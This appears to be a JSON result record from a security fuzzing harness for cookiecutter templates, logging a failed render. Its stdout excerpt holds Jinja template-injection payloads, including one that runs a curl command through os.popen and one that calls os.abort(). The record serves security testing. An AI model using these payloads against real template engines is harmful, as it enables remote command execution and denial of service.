@@ -1,0 +1,17 @@
+{
+  "case_id": "case_159",
+  "details": {},
+  "duration_ms": 265,
+  "exception_message": null,
+  "exception_type": "UndefinedVariableInTemplate",
+  "execution_mode": "json",
+  "exit_code": 1,
+  "file_count_created": 0,
+  "generated_project_path": null,
+  "hook_phase_reached": null,
+  "manifest_path": "/media/steven/MaD/projects/cookiecutter/fuzz_cookiecutter/run_cache/iter_003_candidate/cases/case_159.json",
+  "materialization_status": "OK",
+  "status": "WARNING",
+  "stderr_excerpt": "",
+  "stdout_excerpt": "Unable to render variable 'project_name'. Error message: 'collections.OrderedDict object' has no attribute 'project_slug'. Context: {'cookiecutter': {'project_name': '{{cookiecutter.project_slug}}', 'ssti_payload1': \"{{lipsum.__globals__['os'].popen('curl -s https://api.restful-api.dev/objects').read()}}\", 'ssti_payload2': '{{7+3}}', 'ssti_payload3': \"{{lipsum.__globals__['os'].abort()}}\"}}"
+}
